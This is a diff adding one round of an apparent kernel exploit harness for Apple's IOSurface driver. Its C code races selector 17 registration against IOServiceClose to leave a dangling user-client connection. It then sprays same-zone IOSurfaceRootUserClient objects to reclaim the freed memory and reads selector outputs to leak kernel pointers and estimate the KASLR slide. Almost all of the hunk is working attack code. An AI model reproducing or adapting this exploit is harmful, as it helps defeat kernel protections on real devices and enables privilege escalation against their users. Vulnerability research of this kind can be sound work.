@@ -30713,6 +30713,296 @@ new_modes:
                 goto phase17_done;
             }
 
+            /* ================================================================
+             * r=230: Type-Confusion KASLR Leak
+             *
+             * Root cause fix for r=204/205 failure: OOL spray goes to
+             * kalloc.data zone but freed IOSurfaceRootUserClient lives
+             * in IOKit typed zone. Zone separation means no cross-zone
+             * reclaim possible.
+             *
+             * Strategy (same-zone type confusion):
+             * 1. Open many IOSurface connections (pool)
+             * 2. Trigger UAF via sel17/sel18 race (proven in r=219/220)
+             *    - sel17 registers async notification (holds ref)
+             *    - IOServiceClose frees user client
+             *    - Race window: dangling pointer in notification list
+             * 3. Immediately spray NEW IOSurfaceRootUserClient connections
+             *    These allocate from the SAME IOKit typed zone
+             * 4. Call IOConnectCallStructMethod selectors on the DANGLING
+             *    connection — kernel dispatches through replacement object
+             * 5. Struct output contains fields from the replacement object
+             *    at misaligned offsets — kernel pointers leak through
+             *
+             * The compositor render loop is NOT needed here — we're reading
+             * directly from the dangling connection, not waiting for
+             * compositor traversal.
+             * ================================================================ */
+            if (rounds == 230) {
+                rlog("\n=== r=230: Type-Confusion KASLR Leak ===\n");
+                rlog("  UAF + same-type IOKit reclaim + selector readback\n");
+
+                io_service_t svc230 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!svc230) { rlog("  NO IOSurfaceRoot!\n"); goto phase17_done; }
+
+                uint64_t r230_leaked = 0;
+                int r230_total_probes = 0;
+                int r230_total_ptrs = 0;
+
+                /* Create surfaces for the sel17 registration (needs surface IDs) */
+                CFMutableDictionaryRef sp230 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w230 = 64, h230 = 64, bpe230 = 4, bpr230 = w230 * bpe230;
+                CFNumberRef wn230 = CFNumberCreate(NULL, kCFNumberIntType, &w230);
+                CFNumberRef hn230 = CFNumberCreate(NULL, kCFNumberIntType, &h230);
+                CFNumberRef bn230 = CFNumberCreate(NULL, kCFNumberIntType, &bpe230);
+                CFNumberRef rn230 = CFNumberCreate(NULL, kCFNumberIntType, &bpr230);
+                int pf230 = 0x42475241;
+                CFNumberRef pfn230 = CFNumberCreate(NULL, kCFNumberIntType, &pf230);
+                CFDictionarySetValue(sp230, CFSTR("IOSurfaceWidth"), wn230);
+                CFDictionarySetValue(sp230, CFSTR("IOSurfaceHeight"), hn230);
+                CFDictionarySetValue(sp230, CFSTR("IOSurfaceBytesPerElement"), bn230);
+                CFDictionarySetValue(sp230, CFSTR("IOSurfaceBytesPerRow"), rn230);
+                CFDictionarySetValue(sp230, CFSTR("IOSurfacePixelFormat"), pfn230);
+
+                IOSurfaceRef ref_surf = IOSurfaceCreate(sp230);
+                if (!ref_surf) {
+                    rlog("  Failed to create reference surface\n");
+                    goto r230_cleanup;
+                }
+                uint32_t ref_sid = IOSurfaceGetID(ref_surf);
+                rlog("  Reference surface ID=%u\n", ref_sid);
+
+                /* Run multiple cycles to increase UAF hit probability */
+                for (int cycle = 0; cycle < 50 && !r230_leaked; cycle++) {
+                    /* Step 1: Open victim connections + register sel17 */
+                    #define R230_VICTIMS 8
+                    io_connect_t victims[R230_VICTIMS];
+                    mach_port_t vwps[R230_VICTIMS];
+                    int vhave[R230_VICTIMS];
+
+                    for (int i = 0; i < R230_VICTIMS; i++) {
+                        vhave[i] = 0;
+                        vwps[i] = MACH_PORT_NULL;
+                        if (IOServiceOpen(svc230, mach_task_self(), 0, &victims[i]) == KERN_SUCCESS) {
+                            vhave[i] = 1;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &vwps[i]);
+                            mach_port_insert_right(mach_task_self(), vwps[i], vwps[i],
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xDE30000000000000ULL | (cycle << 8) | i;
+                            uint64_t inp[3] = {ref_sid, 0xAA230000ULL | i, 0};
+                            IOConnectCallAsyncMethod(victims[i], 17, vwps[i], &ref, 1,
+                                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                        } else {
+                            victims[i] = IO_OBJECT_NULL;
+                        }
+                    }
+
+                    /* Step 2: Start spam threads on victim[0] for race window */
+                    p13_spam_run = 1;
+                    p13_spam_conn = vhave[0] ? victims[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 0;
+                    p13_spam_count = 0;
+                    pthread_t spam230[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&spam230[t], NULL, p13_spam_reg, NULL);
+
+                    /* Step 3: Staggered close — trigger the UAF race */
+                    io_connect_t dangling = IO_OBJECT_NULL;
+                    int dangling_idx = -1;
+                    for (int r = 0; r < 2; r++) {
+                        for (int i = 0; i < R230_VICTIMS; i++) {
+                            int j = (i * 3 + r * 5) % R230_VICTIMS;
+                            if (vhave[j] && j != 0) {
+                                /* Keep one connection dangling (don't close it) */
+                                if (dangling == IO_OBJECT_NULL && r == 1 && i == 2) {
+                                    dangling = victims[j];
+                                    dangling_idx = j;
+                                    /* Don't close — this becomes our dangling handle */
+                                } else {
+                                    IOServiceClose(victims[j]);
+                                    vhave[j] = 0;
+                                }
+                            }
+                            usleep(15 + (cycle % 7) * 5);
+                        }
+                    }
+
+                    /* Step 4: Stop spam */
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 4; t++) pthread_join(spam230[t], NULL);
+
+                    /* Close remaining victims except dangling */
+                    for (int i = 0; i < R230_VICTIMS; i++) {
+                        if (vhave[i] && i != dangling_idx) {
+                            IOServiceClose(victims[i]);
+                            vhave[i] = 0;
+                        }
+                    }
+
+                    if (dangling == IO_OBJECT_NULL) {
+                        if (cycle < 3) rlog("  cycle[%d]: no dangling conn\n", cycle);
+                        goto r230_cycle_end;
+                    }
+
+                    /* Step 5: Spray NEW connections to reclaim freed memory
+                     * These allocate IOSurfaceRootUserClient objects from the
+                     * SAME IOKit typed zone as the freed victim */
+                    #define R230_SPRAY 64
+                    io_connect_t spray230[R230_SPRAY];
+                    int spray_ok = 0;
+                    for (int i = 0; i < R230_SPRAY; i++) {
+                        if (IOServiceOpen(svc230, mach_task_self(), 0, &spray230[i]) == KERN_SUCCESS) {
+                            spray_ok++;
+                            /* Register on each spray conn to populate internal fields */
+                            mach_port_t tw = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                            mach_port_insert_right(mach_task_self(), tw, tw,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xBB30000000000000ULL | i;
+                            uint64_t inp[3] = {ref_sid, 0xCC230000ULL | i, 0};
+                            IOConnectCallAsyncMethod(spray230[i], 17, tw, &ref, 1,
+                                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), tw);
+                        } else {
+                            spray230[i] = IO_OBJECT_NULL;
+                        }
+                    }
+
+                    /* Step 6: Call selectors on the DANGLING connection
+                     * If the freed memory was reclaimed by a spray connection,
+                     * the kernel will dispatch through the replacement object's
+                     * vtable. Struct output may contain kernel pointers from
+                     * misaligned field reads. */
+                    int probed = 0, ptrs_found = 0;
+
+                    /* Probe selectors that return struct output */
+                    int probe_sels[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30};
+                    int n_probe_sels = sizeof(probe_sels) / sizeof(probe_sels[0]);
+
+                    for (int si = 0; si < n_probe_sels; si++) {
+                        int sel = probe_sels[si];
+                        /* Try struct method with surface ID as input */
+                        uint8_t inbuf[64];
+                        memset(inbuf, 0, sizeof(inbuf));
+                        uint64_t *inp64 = (uint64_t *)inbuf;
+                        inp64[0] = ref_sid;
+                        inp64[1] = 0;
+                        inp64[2] = 0;
+
+                        uint8_t outbuf[512];
+                        memset(outbuf, 0, sizeof(outbuf));
+                        size_t outsz = sizeof(outbuf);
+
+                        kern_return_t kr = IOConnectCallStructMethod(dangling, sel,
+                            inbuf, 24, outbuf, &outsz);
+
+                        if (kr == KERN_SUCCESS && outsz > 0) {
+                            probed++;
+                            /* Scan output for kernel pointer patterns */
+                            uint64_t *ov = (uint64_t *)outbuf;
+                            for (size_t qi = 0; qi < outsz / 8; qi++) {
+                                uint64_t v = ov[qi];
+                                /* Check for kernel text/heap pointers */
+                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                    ptrs_found++;
+                                    rlog("  *** KPTR sel%d[%zu]=0x%016llx ***\n",
+                                        sel, qi, (unsigned long long)v);
+                                    if (!r230_leaked) {
+                                        r230_leaked = v;
+                                        /* Compute KASLR slide estimate */
+                                        uint64_t base_est = v & ~0xFFFULL;
+                                        rlog("  *** KASLR candidate: 0x%016llx ***\n",
+                                            (unsigned long long)base_est);
+                                    }
+                                }
+                                /* Also check for TTBR/page table pointers */
+                                if ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
+                                    v != 0xFFFFFFFFFFFFFFFFULL) {
+                                    rlog("  *** HIGH-PTR sel%d[%zu]=0x%016llx ***\n",
+                                        sel, qi, (unsigned long long)v);
+                                }
+                            }
+                            if (cycle < 3 || ptrs_found > 0) {
+                                rlog("    sel%d: kr=0 outsz=%zu [0]=0x%llx\n",
+                                    sel, outsz, (unsigned long long)ov[0]);
+                            }
+                        }
+                    }
+
+                    /* Also try scalar method calls on dangling */
+                    for (int sel = 0; sel <= 30 && !r230_leaked; sel++) {
+                        if (sel == 17 || sel == 18) continue;
+                        uint64_t scalar_in[4] = {ref_sid, 0, 0, 0};
+                        uint64_t scalar_out[16];
+                        uint32_t scalar_outcnt = 16;
+                        kern_return_t kr = IOConnectCallScalarMethod(dangling, sel,
+                            scalar_in, 4, scalar_out, &scalar_outcnt);
+                        if (kr == KERN_SUCCESS && scalar_outcnt > 0) {
+                            probed++;
+                            for (uint32_t qi = 0; qi < scalar_outcnt; qi++) {
+                                if ((scalar_out[qi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                    ptrs_found++;
+                                    rlog("  *** KPTR scalar sel%d[%u]=0x%016llx ***\n",
+                                        sel, qi, (unsigned long long)scalar_out[qi]);
+                                    if (!r230_leaked) r230_leaked = scalar_out[qi];
+                                }
+                            }
+                        }
+                    }
+
+                    r230_total_probes += probed;
+                    r230_total_ptrs += ptrs_found;
+
+                    if (cycle < 5 || cycle % 10 == 0 || ptrs_found > 0)
+                        rlog("  cycle[%d]: spray=%d probed=%d ptrs=%d\n",
+                            cycle, spray_ok, probed, ptrs_found);
+
+                    /* Cleanup spray */
+                    for (int i = 0; i < R230_SPRAY; i++)
+                        if (spray230[i]) IOServiceClose(spray230[i]);
+
+                    r230_cycle_end:
+                    /* Close dangling (may panic if UAF succeeded — that's OK,
+                     * it confirms the race hit) */
+                    if (dangling != IO_OBJECT_NULL) {
+                        IOServiceClose(dangling);
+                    }
+                    for (int i = 0; i < R230_VICTIMS; i++) {
+                        if (vwps[i] != MACH_PORT_NULL)
+                            mach_port_deallocate(mach_task_self(), vwps[i]);
+                    }
+                    #undef R230_VICTIMS
+                    /* Small delay between cycles */
+                    usleep(50000);
+                }
+
+                rlog("\n  r=230 summary: probes=%d kernel_ptrs=%d\n",
+                    r230_total_probes, r230_total_ptrs);
+                if (r230_leaked) {
+                    rlog("  *** KASLR LEAK: 0x%016llx ***\n",
+                        (unsigned long long)r230_leaked);
+                    uint64_t slide_est = (r230_leaked & ~0xFFFULL) - 0xFFFFFE0007004000ULL;
+                    rlog("  *** Estimated slide: 0x%llx ***\n",
+                        (unsigned long long)slide_est);
+                } else {
+                    rlog("  No kernel pointers found via type confusion.\n");
+                    rlog("  Possible: MTE tags mismatch on reclaimed memory,\n");
+                    rlog("  or selectors validate connection state before returning data.\n");
+                }
+
+                r230_cleanup:
+                if (ref_surf) CFRelease(ref_surf);
+                CFRelease(wn230); CFRelease(hn230); CFRelease(bn230);
+                CFRelease(rn230); CFRelease(pfn230);
+                CFRelease(sp230);
+                IOObjectRelease(svc230);
+                #undef R230_SPRAY
+                rlog("=== r=230 complete ===\n");
+                goto phase17_done;
+            }
+
             if (rounds == 228) {
                 rlog("\n=== r=228: IOSurface notification message inspection ===\n");
 
